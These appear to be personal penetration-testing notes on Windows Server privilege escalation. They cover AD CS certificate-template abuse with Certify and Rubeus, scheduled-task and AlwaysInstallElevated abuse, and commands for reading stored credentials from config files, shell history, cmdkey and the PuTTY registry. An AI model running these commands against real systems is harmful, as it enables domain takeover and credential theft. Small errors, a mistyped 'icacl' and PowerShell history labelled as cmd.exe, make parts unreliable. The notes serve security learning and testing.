---
title: Windows Server privilege-escalation notes
---

## AD Certificate Services
Being within AD domain where the AD CS is installed, a domain user can request a X.509 certificate for different purposes (including AD authentication via PKINIT feature). AD CS has admin-defined **Certificate Templates** that specify available parameters and values of a requested certificate.

Most important values:

* CA Name - which server is the Certified Authority for the cert.
* Template Name - the name of the cert template.
* Enrollment Rights - who can request (which group of users) such a cert.
* PKI Extended Key Usage - what's the purpose of the cert.

`Certify` is a tool to enumerate and abuse misconfiguration in AD CS (vulnerable certificate templates).

```powershell
# Check possible vulnerabilities in AD certificates
Certify.exe find /vulnerable
```

If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (an user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.

```powershell
# Request an certificate for Administrator
Certify.exe request /ca:<ca-name> /template:<template-name> /altname:Administrator

# Request Kerberos TGT using the received certificate
Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:password /ptt

# Check if privilege escalation works (it might not work but look for NT hash)
dir \\<dc>\C$
```

Requesting TGT using the certificate (with `Rubeus`) should return user's NT hash that can be use to **pass-the-hash** (if PKINIT is enabled). It uses so-called user-to-user (u2u) auth - the user authenticates to itself using Kerberos and retrieves its NT hash.

**NOTE**: Certify.exe returns a `PEM` format certificate. It must be converted into the `PFX` format to use it with `Rubeus`:

```bash
openssl pkcs12 -in <cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <cert.pfx>
```

> **RESOURCES**: [Awesome BlackHat explanation](https://www.youtube.com/watch?v=ejmAIgxFRgM), [corresponding blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

Most `impacket` tools are able to work with TGT authentication.

## Misconfigurations

### Scheduled tasks
If an attacker is able to modify the `Task To Run` file, he can run a code with `Run As User` privileges.

```powershell
# List all scheduled tasks
schtasks /query /tn <task-name> /fo list /v

# Check file permissions
icacl <path>
```

### Services

### AlwaysInstallElevated
`.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.

```powershell
# Check if AlwaysInstallElevated is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Execute an .msi file
msiexec /quiet /qn /i <path>
```

## Credentials looting

### Files

#### IIS configuration
Configuration files of the IIS web server might store some credentials.

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### Unattended Windows installations
If the OS is installed remotely (unattended installation) there is a chance that the installation config file is still somwhere in the file system. It might include credentials.

```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Shell history

```powershell
# To read history from cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
# To read history from Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Memory-saved credentials

```powershell
# Show saved credentials and accounts in a memory
cmdkey /list
```

> **NOTE**: Even if the credentials are not shown, you can use the `runas /savecred /user:<user> cmd.exe` command in order to use them from a memory.

### SSH software
PuTTY is propably the most common SSH client for Windows in use. It often stores session parameters (e.g. proxy configuration) in the Windows registry.

```powershell
# Show PuTTY configuration
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
